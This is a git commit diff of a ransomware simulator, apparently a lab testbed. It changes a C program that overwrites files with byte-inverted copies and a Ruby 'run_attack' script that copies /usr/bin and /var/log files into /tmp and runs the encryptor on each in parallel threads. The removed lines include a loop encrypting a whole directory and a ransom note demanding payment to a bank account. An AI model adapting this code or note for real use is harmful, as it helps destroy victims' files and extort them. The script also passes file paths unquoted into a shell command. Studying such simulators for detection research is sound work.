c5401a2af2606f08145333b062f3eebc825d785d
Weiyang Zhang <sunnylocus@email.arizona.edu>
2021-03-06 16:43:16 -0800

    update

--- ransomware_mac.c
+++ ransomware_mac.c
@@ -64,93 +64,59 @@ const int create_large_file()
 
 int main(int argc, char const *argv[])
 {
-
-	if ((! access("/tmp/labtest.tcis", F_OK)) == 0)
-		create_large_file();
-
-	//Format the desired directory that we want to encrypt
-	char dest_encrypt_dir[MAX_LEN] = "/tmp/";
-
-	struct dirent *de; // Pointer for directory entry
-	DIR *dr = opendir(dest_encrypt_dir);
-	if (dr == NULL)
-	{
-		perror("Could not open the directory");
-		return -1;
-	}
-
 	char full_file_path[MAX_LEN];
 
-	while ((de = readdir(dr)) != NULL) {
-		char src[MAX_LEN], tgt[MAX_LEN], ch;
-		memset(full_file_path, 0, MAX_LEN);
+	char src[MAX_LEN], tgt[MAX_LEN], ch;
+	memset(full_file_path, 0, MAX_LEN);
 
-		strcat(full_file_path, dest_encrypt_dir);
-		strcat(full_file_path, de->d_name);
+	strcat(full_file_path, argv[1]);
 
-		//for test purpose we only encrypt the file with tcis suffix.
-		const char *ext = get_filename_ext(full_file_path);
-		if( strcmp(ext, "tcis")!=0)
-		  continue;
+	//for test purpose we only encrypt the file with tcis suffix.
+	//const char *ext = get_filename_ext(full_file_path);
+	//if( strcmp(ext, "tcis")!=0)
+	//  continue;
 
-		FILE *fs;
-		fs = fopen(full_file_path, "rb");
+	FILE *fs;
+	fs = fopen(full_file_path, "rb");
 
-		if (fs == NULL)
-			continue;
+	if (fs == NULL)
+		return -1;
 
-		sprintf(tgt , "%s.ed", full_file_path); //format the name of the temporary file
+	sprintf(tgt , "%s.ed", full_file_path); //format the name of the temporary file
 
-		FILE *ft;
-		ft = fopen(tgt, "w");
-		if (ft == NULL)
-			continue;
+	FILE *ft;
+	ft = fopen(tgt, "w");
+	if (ft == NULL)
+		return -1;
 
-		time_t t;
-		time(&t);
-		char *curr_time = ctime(&t);
-		curr_time[strlen(curr_time)-1] ='\0';
+	time_t t;
+	time(&t);
+	char *curr_time = ctime(&t);
+	curr_time[strlen(curr_time)-1] ='\0';
 
-		printf("[%s] Ransomware starts to encrypt file!\n", curr_time);
-		int blockSize = 256;
-		char buff[blockSize];
+	printf("[%s] Ransomware starts to encrypt file!\n", curr_time);
+	int blockSize = 256;
+	char buff[blockSize];
 
-		size_t n;
-		while ( (n = fread(buff, 1, blockSize, fs)) != 0) {
-			for (int i = 0; i < n ; i++)
-				buff[i] = ~buff[i]; // encrypt or decrypt
+	size_t n;
+	while ( (n = fread(buff, 1, blockSize, fs)) != 0) {
+		for (int i = 0; i < n ; i++)
+			buff[i] = ~buff[i]; // encrypt or decrypt
 
-			fwrite(buff, 1, n, ft);
-		}
-
-		fclose(fs);
-		fclose(ft);
-
-		remove(full_file_path);
-		rename(tgt, full_file_path);
-
-		time(&t);
-		curr_time = ctime(&t);
-		curr_time[strlen(curr_time)-1] ='\0';
-
-		printf("[%s] Ransomware has finished encrypting the file!\n\n", curr_time);
+		fwrite(buff, 1, n, ft);
 	}
 
-	closedir(dr);
+	fclose(fs);
+	fclose(ft);
 
+	remove(full_file_path);
+	rename(tgt, full_file_path);
 
-	FILE *fwarning;
+	time(&t);
+	curr_time = ctime(&t);
+	curr_time[strlen(curr_time)-1] ='\0';
 
-	fwarning = fopen("/tmp/ReadMe.txt", "w");
-
-	if ( fwarning != NULL)
-	{
-		fputs("\n********************************** Warning !!! **********************************\n", fwarning);
-		fputs("All files on this computer have been encrypted!! You must pay $1,000 to decrypt.\n", fwarning);
-		fputs("Please send money to this bank account: 8989 82838 82800 1937 (Chase Bank). \nOnce I have received your money, you will get the decrypt tool.\n\nThanks for your cooperation!\n", fwarning);
-		fputs("*********************************************************************************", fwarning);
-	}
-	fclose(fwarning);
+	printf("[%s] Ransomware has finished encrypting the file!\n\n", curr_time);
 
 
 	return 0;
--- run_attack.rb
+++ run_attack.rb
@@ -1,21 +1,58 @@
 #!/usr/bin/ruby
 
 require "fileutils"
+require "thread"
 
-#This method is used to copy all files the folder /usr/bin to the /tmp dictionary 
-#symbolic link will be omitted. 
+def cur_time()
+  return Time.now.strftime("%d/%m/%Y %H:%M:%S")
+end
+
+#This method is used to copy all files the folder /usr/bin to the /tmp dictionary
+#symbolic link will be omitted.
 def copy_files2tmp()
-  Dir.foreach('/usr/bin') do |filename|
-  	src_path_file = '/usr/bin/'+filename
-  	dest_path_file = '/tmp/' + filename
-    if not File.symlink?(src_path_file)
-    	if not File.exist?(dest_path_file)
-    		FileUtils.cp(src_path_file, dest_path_file)
-    		msg = "Completed copying the file %-20s to /tmp" % [filename]
-    	end
-
+  Dir.glob(['/var/log/*','/usr/bin/*']) do |filename|
+    src_path_file = filename
+    dest_path_file = '/tmp/' + File.basename(src_path_file)
+    if not ( File.symlink?(src_path_file) or  File.directory?(src_path_file))
+      if not File.exist?(dest_path_file)
+        begin
+          FileUtils.cp(src_path_file, dest_path_file)
+          msg = "[#{cur_time}] Completed copying  %-50s" % [filename]
+          puts msg
+        rescue
+          next
+        end
+      else
+        msg = "[#{cur_time}] %-50s exists, skipped!" % [filename]
+        puts msg
+      end
     end
   end
 end
 
+# This method is used to invoke ransomware_mac to encrypt file
+def start_attack()
+	puts "\n\n!!Finished copying files, the ransomware starts encrypting files by using multiple threads.!!\n\n"
+	threads = []
+	Dir.glob('/tmp/*') do |full_file_path|
+		# build thread to run the encryption program
+		threads << Thread.new { 
+			`./ransomware_mac #{full_file_path}`
+			sleep(rand(1..5))
+			puts "[#{cur_time}] Finished encrypting file #{full_file_path}"
+		}
+		
+		if threads.size > 4 then # 4 threads work simultaneously.
+			threads.each(&:join) # wait all the thread to finish the tasks
+			threads.clear()
+		end
+	end
+end
+
+# The first step is to copy files from /usr/bin and /var/log into 
+# /tmp/ folder
 copy_files2tmp()
+
+# then start to attack 
+start_attack()
+
